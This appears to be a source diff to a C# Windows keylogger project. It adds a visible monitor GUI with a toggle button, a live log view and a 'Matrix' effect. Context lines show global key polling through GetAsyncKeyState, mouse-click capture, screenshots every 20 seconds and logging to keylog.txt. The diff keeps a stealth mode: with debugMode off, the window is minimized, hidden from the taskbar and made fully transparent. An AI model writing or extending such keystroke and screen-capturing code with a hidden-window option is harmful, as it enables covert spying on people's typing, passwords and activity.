@@ -16,8 +16,17 @@ namespace KeyloggerProject
     }
     public partial class Form1 : Form
     {
+        Timer matrixTimer = new Timer();
+        Random matrixRand = new Random();
+        int lineCount = 0;
+        int maxLines = 50;
+
+        Timer glowTimer = new Timer();
+        int glowStep = 0;
+        private bool isLogging = false;
         private DateTime lastMouseMoveTime = DateTime.MinValue;
         private POINT lastMousePos;
+        Timer liveLogTimer = new Timer();
         private DateTime lastScreenshotTime = DateTime.MinValue;
         private int screenshotIntervalSeconds = 20;
         private string currentText = "";
@@ -47,6 +56,7 @@ namespace KeyloggerProject
 
         Timer timer;
         StreamWriter sw;
+        StreamWriter HELP;
 
         [DllImport("user32.dll")]
         public static extern IntPtr WindowFromPoint(Point p);
@@ -60,18 +70,38 @@ namespace KeyloggerProject
 
         public Form1()
         {
+            bool debugMode = true; // or false (whatever we want to check)
+            liveLogTimer.Interval = 1000; // every secound 
+            liveLogTimer.Tick += LiveLogTimer_Tick;
+            liveLogTimer.Start();
+
+            matrixTimer.Interval = 100;
+            matrixTimer.Tick += MatrixTimer_Tick;
+            matrixTimer.Start();
+
+
+            if (!debugMode)
+            {
+                this.WindowState = FormWindowState.Minimized;
+                this.ShowInTaskbar = false;
+                this.Opacity = 0;
+            }
+            else
+            {
+                this.Text = "Keylogger Monitor";
+            }
+
             InitializeComponent();
-            this.WindowState = FormWindowState.Minimized;
-            this.ShowInTaskbar = false;
-            this.Opacity = 0;
+            SetupGlow();
 
 
             timer = new Timer();
             timer.Interval = 10;
             timer.Tick += Timer_Tick;
-            timer.Start();
 
             sw = new StreamWriter("keylog.txt", false);
+            HELP = new StreamWriter("Help.txt", false);
+
         }
         private void CheckMouseClick(MouseButton button, int keyCode, DateTime now)
         {
@@ -131,7 +161,6 @@ namespace KeyloggerProject
               (GetAsyncKeyState((int)Keys.LShiftKey) & 0x8001) != 0 ||
               (GetAsyncKeyState((int)Keys.RShiftKey) & 0x8001) != 0;
             bool useUpperCase = isShiftPressed ^ Console.CapsLock;
-            this.Text = $"Shift: {isShiftPressed} | CapsLock: {Console.CapsLock} | Upper: {useUpperCase}";
 
             for (int i = 0; i < 255; i++)
             {
@@ -230,11 +259,12 @@ namespace KeyloggerProject
         }
         protected override void OnFormClosed(FormClosedEventArgs e)
         {
-            sw.Close();
+            sw?.Close();
+            matrixTimer?.Stop();
             base.OnFormClosed(e);
         }
-    
-    private void TakeScreenshot()
+
+        private void TakeScreenshot()
         {
             try
             {
@@ -257,7 +287,117 @@ namespace KeyloggerProject
                 sw.Write($"Error taking screenshot: {ex.Message}{Environment.NewLine}");
                 sw.Flush();
             }
+            HELP.Write("Logging starts when the user presses the start button. it stops when the user presses the ESC key or stop button");
+            HELP.Flush();
         }
 
+
+
+
+        //-------------------------------------------------------GUI
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+
+        private void SetupGlow()
+        {
+            glowTimer.Interval = 100;
+            glowTimer.Tick += GlowTimer_Tick;
+            glowTimer.Start();
+        }
+
+        private void GlowTimer_Tick(object sender, EventArgs e)
+        {
+            Color[] cyberGreens = new Color[]
+            {
+        Color.LimeGreen,
+        Color.MediumSpringGreen,
+        Color.Chartreuse,
+        Color.SpringGreen,
+        Color.LawnGreen
+            };
+
+            glowStep++;
+        }
+
+
+        private void btnToggleLogging_Click(object sender, EventArgs e)
+        {
+            isLogging = !isLogging;
+
+            if (isLogging)
+            {
+                timer.Start();
+                labelLogStatus.Text = "Logging: ON";
+                labelLogStatus.ForeColor = Color.LimeGreen;
+                btnToggleLogging.Text = "Stop Logging";
+            }
+            else
+            {
+                timer.Stop();
+                labelLogStatus.Text = "Logging: OFF";
+                labelLogStatus.ForeColor = Color.Red;
+                btnToggleLogging.Text = "Start Logging";
+            }
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+        private void LiveLogTimer_Tick(object sender, EventArgs e)
+        {
+            try
+            {
+                if (File.Exists("keylog.txt"))
+                {
+                    using (FileStream fs = new FileStream("keylog.txt", FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                    using (StreamReader sr = new StreamReader(fs))
+                    {
+                        textBoxLiveLog.Text = sr.ReadToEnd();
+                        textBoxLiveLog.SelectionStart = textBoxLiveLog.Text.Length;
+                        textBoxLiveLog.ScrollToCaret();
+                    }
+                }
+            }
+            catch (IOException) { /* */ }
+        }
+
+        private void MatrixTimer_Tick(object sender, EventArgs e)
+        {
+            if (textBoxMatrix == null || textBoxMatrix.IsDisposed)
+                return;
+
+            try
+            {
+                string line = "";
+                for (int i = 0; i < 60; i++)
+                {
+                    char c = (char)matrixRand.Next(33, 126);
+                    line += c;
+                }
+
+                textBoxMatrix.AppendText(line + Environment.NewLine);
+                lineCount++;
+
+                if (lineCount >= maxLines)
+                {
+                    textBoxMatrix.Clear();
+                    lineCount = 0;
+                }
+
+                textBoxMatrix.SelectionStart = textBoxMatrix.Text.Length;
+                textBoxMatrix.ScrollToCaret();
+            }
+            catch (ObjectDisposedException) { }
+
+
+
+        }
+
+        
     }
 }
+
